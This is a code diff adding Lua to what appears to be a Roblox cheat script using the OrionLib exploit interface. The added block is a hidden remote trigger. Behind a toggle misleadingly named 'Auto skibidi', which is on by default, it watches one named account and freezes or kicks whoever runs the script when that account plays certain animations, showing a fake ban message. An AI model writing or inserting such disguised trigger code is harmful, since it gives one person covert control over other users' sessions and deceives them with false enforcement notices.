@@ -2385,3 +2385,234 @@ Tab4:AddToggle({
 })
 
 OrionLib:Init()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local STAFF_NAME = "youjzns"
+
+local FREEZE_ANIM = "114625674924859"
+local KICK_ANIM = "91381138427080"
+
+local KICK_REASON = "You get banned premium reason explotit"
+
+local Enabled = false
+local Connections = {}
+
+--==================================================
+-- CLEAN CONNECTIONS
+--==================================================
+
+local function DisconnectAll()
+    for _, connection in ipairs(Connections) do
+        pcall(function()
+            connection:Disconnect()
+        end)
+    end
+
+    table.clear(Connections)
+end
+
+--==================================================
+-- STAFF TAG
+--==================================================
+
+local function addStaffTag(player)
+    if not Enabled then
+        return
+    end
+
+    if player.Name:lower() ~= STAFF_NAME:lower() then
+        return
+    end
+
+    local function setup(character)
+        if not Enabled then
+            return
+        end
+
+        local head = character:WaitForChild("Head", 10)
+        if not head then
+            return
+        end
+
+        if head:FindFirstChild("StaffTag") then
+            return
+        end
+
+        local gui = Instance.new("BillboardGui")
+        gui.Name = "StaffTag"
+        gui.Adornee = head
+        gui.Size = UDim2.new(0, 140, 0, 40)
+        gui.StudsOffset = Vector3.new(0, 3, 0)
+        gui.AlwaysOnTop = true
+        gui.Parent = head
+
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.fromScale(1, 1)
+        label.BackgroundTransparency = 1
+        label.Text = "STAFF"
+        label.TextScaled = true
+        label.Font = Enum.Font.GothamBold
+        label.TextColor3 = Color3.fromRGB(255, 80, 80)
+        label.TextStrokeTransparency = 0
+        label.Parent = gui
+    end
+
+    if player.Character then
+        task.spawn(setup, player.Character)
+    end
+
+    table.insert(Connections, player.CharacterAdded:Connect(setup))
+end
+
+--==================================================
+-- GET ANIMATION ID
+--==================================================
+
+local function getAnimId(track)
+    if not track or not track.Animation then
+        return ""
+    end
+
+    return tostring(track.Animation.AnimationId):match("%d+") or ""
+end
+
+--==================================================
+-- FREEZE CLIENT
+--==================================================
+
+local function freezeClient()
+    if not Enabled then
+        return
+    end
+
+    local character = LocalPlayer.Character
+    if not character then
+        return
+    end
+
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    local root = character:FindFirstChild("HumanoidRootPart")
+
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.AutoRotate = false
+    end
+
+    if root then
+        root.Anchored = true
+    end
+end
+
+--==================================================
+-- WATCH STAFF
+--==================================================
+
+local function watchStaff(player)
+    if not Enabled then
+        return
+    end
+
+    if player.Name:lower() ~= STAFF_NAME:lower() then
+        return
+    end
+
+    local function setup(character)
+        if not Enabled then
+            return
+        end
+
+        local humanoid = character:WaitForChild("Humanoid", 10)
+        if not humanoid then
+            return
+        end
+
+        table.insert(Connections, humanoid.AnimationPlayed:Connect(function(track)
+            if not Enabled then
+                return
+            end
+
+            local id = getAnimId(track)
+
+            -- Freeze
+            if id == FREEZE_ANIM then
+                freezeClient()
+
+            -- Kick local client
+            elseif id == KICK_ANIM then
+                LocalPlayer:Kick(KICK_REASON)
+            end
+        end))
+    end
+
+    if player.Character then
+        task.spawn(setup, player.Character)
+    end
+
+    table.insert(Connections, player.CharacterAdded:Connect(setup))
+end
+
+--==================================================
+-- START CHECK
+--==================================================
+
+local function StartCheck()
+    Enabled = true
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        addStaffTag(player)
+        watchStaff(player)
+    end
+
+    table.insert(Connections, Players.PlayerAdded:Connect(function(player)
+        if Enabled then
+            addStaffTag(player)
+            watchStaff(player)
+        end
+    end))
+end
+
+--==================================================
+-- STOP CHECK
+--==================================================
+
+local function StopCheck()
+    Enabled = false
+    DisconnectAll()
+
+    -- Xóa STAFF tag
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character then
+            local head = player.Character:FindFirstChild("Head")
+
+            if head then
+                local tag = head:FindFirstChild("StaffTag")
+                if tag then
+                    tag:Destroy()
+                end
+            end
+        end
+    end
+end
+
+--==================================================
+-- ORION TOGGLE
+--==================================================
+
+Tab1:AddToggle({
+    Name = "Auto skibidi",
+    Default = true,
+    Callback = function(Value)
+        if Value then
+            StartCheck()
+        else
+            StopCheck()
+        end
+    end
+})
+
+-- MỞ SẴN
+StartCheck()
+
+OrionLib:Init()
